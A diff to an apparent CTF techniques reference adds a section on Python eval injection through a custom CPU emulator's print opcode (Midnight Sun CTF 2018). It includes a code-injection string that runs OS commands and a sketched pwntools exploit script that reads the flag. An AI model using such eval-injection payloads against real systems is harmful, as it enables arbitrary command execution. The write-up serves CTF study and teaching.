@@ -10,6 +10,7 @@
 - [process_vm_readv Failure as Sandbox Escape (0CTF 2016)](#process_vm_readv-failure-as-sandbox-escape-0ctf-2016)
 - [Named Pipe mkfifo for File Size Check Bypass (Nuit du Hack 2016)](#named-pipe-mkfifo-for-file-size-check-bypass-nuit-du-hack-2016)
 - [Lua Integer Underflow via Game Logic (ASIS CTF Finals 2017)](#lua-integer-underflow-via-game-logic-asis-ctf-finals-2017)
+- [CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)](#cpu-emulator-print-opcode-python-eval-injection-midnight-sun-ctf-2018)
 
 ---
 
@@ -209,3 +210,49 @@ inventory = inventory - math.floor(inventory * 1.00)  -- 100% decay = zeroed
 **Key insight:** Business logic bugs in game economies create integer underflows without any memory corruption — two uncapped percentage reductions exceeding 100% underflow the target variable. Look for any game mechanic that applies multiple independent percentage modifications to the same integer value in the same tick.
 
 **References:** ASIS CTF Finals 2017
+
+---
+
+### CPU Emulator Print Opcode Python eval Injection (Midnight Sun CTF 2018)
+
+**Pattern:** Custom CPU emulator's print function uses `eval('"' + string_buffer + '"')` to process escape sequences in the output. Build a string in emulator memory character-by-character using ADD opcodes, then inject: `"+__import__("os").system("cmd")#` to escape the string literal and execute arbitrary Python.
+
+**Exploitation strategy:**
+1. The emulator implements a custom instruction set with ADD, MOV, PRINT, etc.
+2. The PRINT opcode reads a string from emulator memory and passes it to `eval('"' + s + '"')` to handle escape sequences like `\n`, `\t`
+3. Use ADD opcodes to build the injection string character-by-character in emulator memory
+4. The injected string `"+__import__("os").system("cmd")#` closes the opening quote, concatenates with `__import__("os").system()`, and `#` comments out the trailing quote
+
+```python
+from pwn import *
+
+# Emulator opcodes (example encoding)
+ADD = 0x01   # ADD addr, immediate_byte
+PRINT = 0x58  # Print string from memory (triggers eval)
+
+def build_char(c):
+    """Generate ADD opcodes to set a memory byte to character c"""
+    addr = current_mem_ptr()
+    return bytes([ADD, addr, ord(c)])
+
+# Build injection payload in emulator memory
+cmd = "cat /flag"
+injection = '''"+__import__("os").system("%s")#''' % cmd
+
+program = b""
+for c in injection:
+    program += build_char(c)
+
+# Trigger PRINT opcode -> eval('"' + injection + '"')
+# eval becomes: eval('""+__import__("os").system("cat /flag")#"')
+# The # comments out the trailing quote
+program += bytes([PRINT, 0x00])  # PRINT from address 0
+
+io = remote('target', 1337)
+io.send(program)
+io.interactive()
+```
+
+**Key insight:** When an emulator or interpreter uses `eval()` to process string output (e.g., for escape sequences), inject a quote to close the string literal, then chain arbitrary Python code. The `#` comment character truncates any trailing syntax. This is a classic eval injection -- the emulator trusts its own memory contents, but the attacker controls memory via normal CPU opcodes.
+
+**References:** Midnight Sun CTF 2018
